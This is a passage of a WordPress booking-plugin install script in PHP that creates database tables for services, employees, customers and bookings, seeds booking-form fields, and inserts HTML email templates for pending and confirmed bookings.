<?php
require_once(dirname(dirname(dirname( dirname( __FILE__ ) ))) . '/wp-config.php' );
function royalBookingSystemInstall()
{
	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
 	if ($wpdb->get_var('SHOW TABLES LIKE ' . servicesTable()) != servicesTable()) 
	{
		$sql = 'CREATE TABLE ' . servicesTable() . '( 
            ServiceId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            ServiceName VARCHAR(200) NOT NULL,
            ServiceCost DECIMAL(10, 2) NOT NULL,
			ServiceDisplayOrder INTEGER(5) NOT NULL,
			ServiceMaxBookings INTEGER(10),
			ServiceShortCode VARCHAR(50) NOT NULL,
			ServiceTotalTime INTEGER(10) NOT NULL,
			Type INTEGER(2) NOT NULL,
            PRIMARY KEY (ServiceId),
            KEY `idx_ServiceName` (`ServiceName`)			 
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . employeesTable()) != employeesTable()) 
	{
		$sql = 'CREATE TABLE ' . employeesTable() . '( 
            EmployeeId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            EmployeeName VARCHAR(200) NOT NULL,
            EmployeeEmail VARCHAR(100) NOT NULL,
			EmployeePhone VARCHAR(20) NOT NULL,
			EmployeeUniqueCode INTEGER(10) NOT NULL,
			EmployeeColorCode VARCHAR(10) NOT NULL,
			Date DATE NOT NULL,
            PRIMARY KEY (EmployeeId),
            KEY `idx_EmployeeName` (`EmployeeName`)			 
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . services_AllocationTable()) != services_AllocationTable()) 
	{
		$sql = 'CREATE TABLE ' . services_AllocationTable() . '( 
            AllocationId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            EmployeeId INTEGER(10) NOT NULL,
            ServiceId INTEGER(10) NOT NULL,
            PRIMARY KEY (AllocationId)		 
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . employees_TimingsTable()) != employees_TimingsTable()) 
	{
		$sql = 'CREATE TABLE ' . employees_TimingsTable() . '( 
            TimingId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            EmployeeId INTEGER(10) NOT NULL,
            Day VARCHAR(20) NOT NULL,
            StartTime int(10) NOT NULL,
            EndTime int(10) NOT NULL,
            Status int,
            PRIMARY KEY (TimingId)		 
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . customersTable()) != customersTable()) 
	{
		$sql = 'CREATE TABLE ' . customersTable() . '( 
            CustomerId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            CustomerFirstName VARCHAR(50) NOT NULL,
            CustomerLastName VARCHAR(50) NOT NULL,
            CustomerEmail VARCHAR(100) NOT NULL,
            CustomerTelephone VARCHAR(20) NOT NULL,
            CustomerMobile VARCHAR(20) NOT NULL,
            CustomerAddress1 VARCHAR(100) NOT NULL,
            CustomerAddress2 VARCHAR(100) NOT NULL,
            CustomerCity VARCHAR(50) NOT NULL,
            CustomerZipCode VARCHAR(50) NOT NULL,
            CustomerCountry INTEGER(5) NOT NULL,
            CustomerComments TEXT NOT NULL,
            DateTime DATE NOT NULL,
            PRIMARY KEY (CustomerId),
            KEY `idx_CustomerFirstName` (`CustomerFirstName`),
            KEY `idx_CustomerLastName` (`CustomerLastName`),
            KEY `idx_CustomerEmail` (`CustomerEmail`),
            KEY `idx_CustomerMobile` (`CustomerMobile`),
            KEY `idx_CustomerCity` (`CustomerCity`)							 
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	
 	if ($wpdb->get_var('SHOW TABLES LIKE ' . currenciesTable()) != currenciesTable()) 
	{
		$sql = 'CREATE TABLE ' . currenciesTable() . '( 
            CurrencyId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            CurrencyName VARCHAR(50) NOT NULL,
            CurrencySymbol VARCHAR(10) NOT NULL,
            CurrencyCode VARCHAR(10) NOT NULL,
            CurrencyUsed INTEGER(1) NOT NULL,
            PRIMARY KEY (CurrencyId),
            KEY `idx_CurrencyName` (`CurrencyName`)
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	
 	if ($wpdb->get_var('SHOW TABLES LIKE ' . countriesTable()) != countriesTable()) 
	{
		$sql = 'CREATE TABLE ' . countriesTable() . '( 
            CountryId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            CountryName VARCHAR(100) NOT NULL,
            CountryUsed INTEGER(1) NOT NULL,
            CountryDefault INTEGER(1) NOT NULL,
            PRIMARY KEY (CountryId),
            KEY `idx_CountryName` (`CountryName`)
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . email_templatesTable()) != email_templatesTable()) 
	{
		$sql = 'CREATE TABLE ' . email_templatesTable() . '( 
            EmailId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            EmailContent text NOT NULL,
            EmailSubject VARCHAR(500) NOT NULL,
            EmailType VARCHAR(100) NOT NULL,
            PRIMARY KEY (EmailId),
            KEY `idx_EmailSubject` (`EmailSubject`),
            KEY `idx_EmailType` (`EmailType`)
        ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . generalSettingsTable()) != generalSettingsTable()) 
	{
		$sql = 'CREATE TABLE ' . generalSettingsTable() . '( 
            GeneralSettingsId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            GeneralSettingsKey TEXT NOT NULL,
            GeneralSettingsValue TEXT NOT NULL,
            PRIMARY KEY (GeneralSettingsId)
          ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . blockTimeTable()) != blockTimeTable()) 
	{
		$sql = 'CREATE TABLE ' . blockTimeTable() . '( 
            BlockTimeId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            EmployeeId INTEGER(10) NOT NULL,
            TimeSlot VARCHAR(50) NOT NULL,
            Day DATE NOT NULL,
            PRIMARY KEY (BlockTimeId)
          ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . blockDateTable()) != blockDateTable()) 
	{
		$sql = 'CREATE TABLE ' . blockDateTable() . '( 
            BlockDateId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            EmployeeId INTEGER(10) NOT NULL,
            Day DATE NOT NULL,
            PRIMARY KEY (BlockDateId)
          ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . bookingTable()) != bookingTable()) 
	{
		$sql = 'CREATE TABLE ' . bookingTable() . '( 
            BookingId INTEGER(10) UNSIGNED NOT NULL AUTO_INCREMENT,
            CustomerId INTEGER(10) NOT NULL,
            ServiceId INTEGER(10) NOT NULL,
            EmployeeId INTEGER(10) NOT NULL,
            TimeSlot INTEGER(10) NOT NULL,
            Date DATETIME NOT NULL,
            BookingStatus VARCHAR(50),
            DateofBooking DATE NOT NULL,
            Comments VARCHAR(250),
            TransactionId VARCHAR(50),
            PaymentStatus VARCHAR(20),
            PaymentDate DATETIME,
            PRIMARY KEY (BookingId)
          ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
	if ($wpdb->get_var('SHOW TABLES LIKE ' . bookingFormTable()) != bookingFormTable()) 
	{
		$sql = 'CREATE TABLE ' . bookingFormTable() . '( 
            BookingFormId INTEGER(10) UNSIGNED AUTO_INCREMENT,
			BookingFormField VARCHAR(100),
			status INT(1),
			required INT(1),
			type VARCHAR(50),
			validation VARCHAR(15),
            PRIMARY KEY (BookingFormId)
          ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE utf8_general_ci';
		dbDelta($sql);
	}
 	$wpdb->query
	(      
		$wpdb->prepare
		(
		      "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		      "Email :",
		      "1",
		      "1",
		      "textbox",
		      "email"
		)
	);
	$wpdb->query
	(      
		$wpdb->prepare
		(
		                "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "First Name :",
		                "1",
		                "1",
		                "textbox",
		                ""
		          )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		                "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "Last Name :",
		                "0",
		                "0",
		                "textbox",
		                ""
		          )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		                "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "Mobile :",
		                "0",
		                "0",
		                "textbox",
		                "maskPhone"
		          )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		               "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "Phone :",
		                "0",
		                "0",
		                "textbox",
		                "maskPhone"
		          )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		               "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "Address Line1 :",
		                "0",
		                "0",
		                "textbox",
		                ""
		          )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		              	"INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "Address Line2 :",
		                "0",
		                "0",
		                "textbox",
		                ""
		          )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		                "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "City :",
		                "0",
		                "0",
		                "textbox",
		                ""
		          )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		                "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "Zip/Post Code :",
		                "0",
		                "0",
		                "textbox",
		                ""
		         )
			);
			$wpdb->query
			(      
			      $wpdb->prepare
			      (
		                "INSERT INTO ".bookingFormTable(). "(BookingFormField,status,required,type,validation)VALUES(%s, %d, %d, %s, %s)",
		                "Country :",
		                "0",
		                "0",
		                "dropdown",
		                ""
		          )
			);		
	
	$url = plugins_url('', __FILE__);
	$url1 = site_url();
	$wpdb->insert(email_templatesTable(), array('EmailType' => "booking-pending-confirmation", 'EmailContent' => "<style type=\"text/css\">
body {
margin:0;
padding:0;
background-color:#eeeeee;
color:#777777;
font-family:Arial, Helvetica, sans-serif;
font-size:12px;
-webkit-text-size-adjust:none;
-ms-text-size-adjust:none;
}
h1, h2 {
color:#3b5167;
margin-bottom:10px !important;
}
a, a:link, a:visited {
color:#82ad0f;
text-decoration:none;
}
a:hover, a:active {
text-decoration:none;
color:#6d8c1b !important;
}
p {
margin:0 0 14px 0;
}
img {
border:0;
}
table td {
border-collapse:collapse;
}
.highlighted {
background-color:#ffe69e;
color:#3b5167;
padding:2px 4px;
border-radius:2px;
-moz-border-radius:2px;
-webkit-border-radius:2px;
}

.ReadMsgBody {width: 100%;}
.ExternalClass {width: 100%;}
.yshortcuts {color: #82ad0f;}
.yshortcuts a span {color: #82ad0f; border-bottom: none !important; background: none !important;}

</style>
<table id=\"pageContainer\" style=\"border-collapse: collapse; background-repeat: repeat; background-color: #eeeeee;\" width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"padding: 30px 20px 40px 20px;\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
<tr>
<td style=\"padding: 40px 30px 35px 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #82ad0f;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\"><img style=\"display: block;\" alt=\"Logo\" src=\"$url/images/logo.png\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding: 20px 30px 15px 0; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #777777; text-align: right;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\">
<table style=\"border-collapse: collapse; text-align: center; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #777777;\" width=\"254\" cellspacing=\"0\" cellpadding=\"0\" align=\"right\">
<tbody>
<tr>
<td style=\"line-height: 100%; color: #82ad0f;\" valign=\"top\" width=\"66\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"><a style=\"text-decoration: none; color: #82ad0f; display: block; line-height: 100%;\" href=\"#\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/websiteIcon.png\" width=\"32\" height=\"32\" border=\"0\" hspace=\"11\" vspace=\"0\" /> Website</a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>

<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#ffffff\">
<tbody>


<tr>
<td style=\"padding-right: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">

<p style=\"font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 36px; line-height: 30pt; color: #3b5167; font-weight: 300; margin-top: 0; margin-bottom: 0px !important; padding: 0; text-indent: -3px;\">Pending Confirmation.</p>
<p style=\"font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 20px; line-height: 30pt; color: #3b5167; font-weight: 300; margin-top: 0; margin-bottom: 20px !important; padding: 0; text-indent: -3px;\">Thank you for your booking request!</p>
<p><strong>As soon as your booking will be approved we will notify you by email.</strong><br/><br/>
Your Booking Details are as follows:<br/><br/>
Service By: <strong>[employee_name]</strong><br/>
For: <strong>[service_name]</strong><br/>
At: <strong>[companyName]</strong><br/>
On: <strong>[booked_date] [booked_time]</strong></p>



</td>

</tr>

<tr>

<td style=\"padding-right: 30px; padding-bottom: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">




Best Regards,<br/><br/>

[employee_name]<br/>

<strong>[companyName]</strong>
</p>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of content with author bio -->

<!-- Start of footer -->
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#444444\">
<tbody>
<tr>
<td>
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 30px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">Copyright <img style=\"vertical-align: -1px;\" alt=\"©\" src=\"$url/images/copyright.png\" width=\"11\" height=\"12\" border=\"0\" /> 2013 <a style=\"text-decoration: underline; color: #82ad0f;\" href=\"http://bookings-plus.com\">Bookings-Plus.com</a> all rights reserved.13 Park Steakhouse, New Jersey, USA</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 34px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #cccccc;\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/homeIcon.png\" width=\"13\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"#\">www.bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/emailIcon.png\" width=\"12\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"mailto:\">info@bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/phoneIcon.png\" width=\"11\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\">+1- 888 4110 572</td>
</tr>
</tbody>
</table>
</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of footer --></td>
</tr>
</tbody>
</table>", 'EmailSubject' => "Your Booking is Pending Approval"));
    
	$wpdb->insert(email_templatesTable(), array('EmailType' => "booking-confirmation", 'EmailContent' => "<style type=\"text/css\">
body {
margin:0;
padding:0;
background-color:#eeeeee;
color:#777777;
font-family:Arial, Helvetica, sans-serif;
font-size:12px;
-webkit-text-size-adjust:none;
-ms-text-size-adjust:none;
}
h1, h2 {
color:#3b5167;
margin-bottom:10px !important;
}
a, a:link, a:visited {
color:#82ad0f;
text-decoration:none;
}
a:hover, a:active {
text-decoration:none;
color:#6d8c1b !important;
}
p {
margin:0 0 14px 0;
}
img {
border:0;
}
table td {
border-collapse:collapse;
}
.highlighted {
background-color:#ffe69e;
color:#3b5167;
padding:2px 4px;
border-radius:2px;
-moz-border-radius:2px;
-webkit-border-radius:2px;
}

.ReadMsgBody {width: 100%;}
.ExternalClass {width: 100%;}
.yshortcuts {color: #82ad0f;}
.yshortcuts a span {color: #82ad0f; border-bottom: none !important; background: none !important;}

</style>
<table id=\"pageContainer\" style=\"border-collapse: collapse; background-repeat: repeat; background-color: #eeeeee;\" width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"padding: 30px 20px 40px 20px;\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\">
<tbody>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" bgcolor=\"#82ad0f\" height=\"7\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"600\" height=\"7\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
<tr>
<td style=\"padding: 40px 30px 35px 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #82ad0f;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\"><img style=\"display: block;\" alt=\"Logo\" src=\"$url/images/logo.png\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding: 20px 30px 15px 0; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #777777; text-align: right;\" valign=\"middle\" bgcolor=\"#ffffff\" width=\"255\">
<table style=\"border-collapse: collapse; text-align: center; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #777777;\" width=\"254\" cellspacing=\"0\" cellpadding=\"0\" align=\"right\">
<tbody>
<tr>
<td style=\"line-height: 100%; color: #82ad0f;\" valign=\"top\" width=\"66\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"></td>
<td style=\"padding: 0 10px; line-height: 100%; text-align: center;\" width=\"20\"></td>
<td style=\"line-height: 100%;\" valign=\"top\" width=\"54\"><a style=\"text-decoration: none; color: #82ad0f; display: block; line-height: 100%;\" href=\"#\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/websiteIcon.png\" width=\"32\" height=\"32\" border=\"0\" hspace=\"11\" vspace=\"0\" /> Website</a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" colspan=\"2\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>

<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #777777;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#ffffff\">
<tbody>
<tr>
<td style=\"padding-top: 30px; padding-right: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 100%; color: #aaaaaa;\"><img style=\"vertical-align: -1px;\" alt=\"\" src=\"$url/images/dateIcon.png\" width=\"12\" height=\"14\" border=\"0\" hspace=\"0\" vspace=\"0\" />&nbsp;&nbsp;[date]</td>
</tr>
<tr>
<td style=\"padding-right: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">
<p style=\"font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 36px; line-height: 30pt; color: #3b5167; font-weight: 300; margin-top: 0; margin-bottom: 20px !important; padding: 0; text-indent: -3px;\">Booking has been Confirmed!</p>
</td>
</tr>
<tr>
<td style=\"padding-right: 30px; padding-bottom: 30px; padding-left: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #777777;\">Hi [client_name],
<p>
Your Booking for [service_name] on [booked_date] at [booked_time] is now <strong>CONFIRMED!</strong>
</p>
<p>
I look forward to seeing you, please ensure to be 5 minutes early for your appointment.
</p>
<p>
<span style=\"color: red;\">**Cancellation Policy: Booking must be cancelled at least 48 hours prior to your appointment.</span>
</p>
<p>
Best Regards,<br/><br/>

[employee_name]<br/>

<strong>[companyName]</strong>
</p>
</td>
</tr>
<tr>
<td style=\"font-size: 2px; line-height: 0px;\" height=\"11\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/divider.png\" width=\"600\" height=\"11\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
<!-- End of content with author bio -->

<!-- Start of footer -->
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\" align=\"center\" bgcolor=\"#444444\">
<tbody>
<tr>
<td>
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 15pt; color: #cccccc;\" width=\"600\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 30px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">Copyright <img style=\"vertical-align: -1px;\" alt=\"©\" src=\"$url/images/copyright.png\" width=\"11\" height=\"12\" border=\"0\" /> 2013 <a style=\"text-decoration: underline; color: #82ad0f;\" href=\"http://bookings-plus.com\">Bookings-Plus.com</a> all rights reserved.13 Park Steakhouse, New Jersey, USA</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td style=\"padding-top: 34px; padding-bottom: 30px; font-family: Arial, Helvetica, sans-serif; font-size: 12px; line-height: 15pt; color: #cccccc;\" valign=\"top\" width=\"160\">
<table style=\"border-collapse: collapse; text-align: left; font-family: Arial, Helvetica, sans-serif; font-weight: normal; font-size: 12px; line-height: 100%; color: #cccccc;\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">
<tbody>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/homeIcon.png\" width=\"13\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"#\">www.bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/emailIcon.png\" width=\"12\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\"><a style=\"text-decoration: underline; color: #82ad0f; line-height: 9pt;\" href=\"mailto:\">info@bookings-plus.com</a></td>
</tr>
<tr>
<td class=\"footer_list_image\" style=\"padding: 0 0 9px 0;\" valign=\"top\" width=\"20\"><img style=\"display: block;\" alt=\"●\" src=\"$url/images/phoneIcon.png\" width=\"11\" height=\"12\" align=\"left\" border=\"0\" /></td>
<td class=\"footer_list\" style=\"padding: 0 0 9px 0; line-height: 9pt;\" valign=\"top\" width=\"140\">+1- 888 4110 572</td>
</tr>
</tbody>
</table>
</td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
<td width=\"30\"><img style=\"display: block;\" alt=\"\" src=\"$url/images/blank.gif\" width=\"30\" height=\"10\" align=\"left\" border=\"0\" hspace=\"0\" vspace=\"0\" /></td>
</tr>
</tbody>
</table>
